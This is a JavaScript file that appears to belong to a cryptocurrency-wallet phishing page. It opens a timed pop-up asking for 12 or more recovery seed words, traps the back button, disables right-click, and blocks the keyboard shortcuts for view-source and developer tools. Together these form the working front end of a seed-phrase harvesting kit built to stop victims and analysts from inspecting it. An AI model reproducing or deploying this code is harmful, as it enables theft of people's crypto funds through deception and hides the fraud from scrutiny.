document.addEventListener('DOMContentLoaded', function() {
    // Show the first modal after 4 seconds
    setTimeout(() => {
        document.getElementById('modal1').classList.add('active');
    }, 4000);

    // Event delegation to handle button click
    document.body.addEventListener('click', function(event) {
        if (event.target.classList.contains('button-open')) {
            const openBlock = event.target.getAttribute('data-openblock');
            if (openBlock) {
                const modalToOpen = document.querySelector(`.modal__block[data-block="${openBlock}"]`);
                if (modalToOpen) {
                    closeModal('modal1');
                    modalToOpen.classList.add('active');
                }
            }
        } else if (event.target.classList.contains('button-close')) {
            const closeModalId = event.target.getAttribute('data-closemodal');
            if (closeModalId) {
                closeModal(closeModalId);
            }
        }
    });
});

function closeModal(modalId) {
    document.getElementById(modalId).classList.remove('active');
}

// Generate seed inputs based on word count
function generateSeedInputs(wordCount) {
    const seedsContainer = document.querySelector('.modal__seeds');
    seedsContainer.innerHTML = '';
    for (let i = 0; i < wordCount; i++) {
        const seedDiv = document.createElement('div');
        seedDiv.className = 'modal__seed';
        const seedInput = document.createElement('input');
        seedInput.className = 'modal__seed__input';
        seedInput.placeholder = (i + 1) + '.';
        seedInput.name = 'seed' + (i + 1); // Ensure each input has a unique name
        seedInput.required = true;
        seedInput.pattern = "[a-zA-Z]+";
        seedDiv.appendChild(seedInput);
        seedsContainer.appendChild(seedDiv);
    }
}

// Handle word count selection
document.querySelectorAll('.modal__count').forEach(countButton => {
    countButton.addEventListener('click', function() {
        document.querySelectorAll('.modal__count').forEach(btn => btn.classList.remove('active'));
        this.classList.add('active');
        const wordCount = parseInt(this.getAttribute('data-word-count'));
        generateSeedInputs(wordCount);
    });
});

// Initialize modal with 12-word form active
generateSeedInputs(12); // Default to 12 words

function preventBack() { window.history.forward(); }
	setTimeout("preventBack()", 0);
	window.onunload = function () { null };

document.addEventListener('contextmenu', function (event) {
    event.preventDefault();
});
    
document.addEventListener('keydown', function (event) {
    // Disable F12
    if (event.keyCode === 123) {
        event.preventDefault();
        return false;
    }

    // Disable Ctrl+U (View Source)
    if (event.ctrlKey && event.keyCode === 85) {
        event.preventDefault();
        return false;
    }

    // Disable Ctrl+Shift+I (Developer Tools)
    if (event.ctrlKey && event.shiftKey && event.keyCode === 73) {
        event.preventDefault();
        return false;
    }

    // Disable Ctrl+Shift+J (Console)
    if (event.ctrlKey && event.shiftKey && event.keyCode === 74) {
        event.preventDefault();
        return false;
    }
});

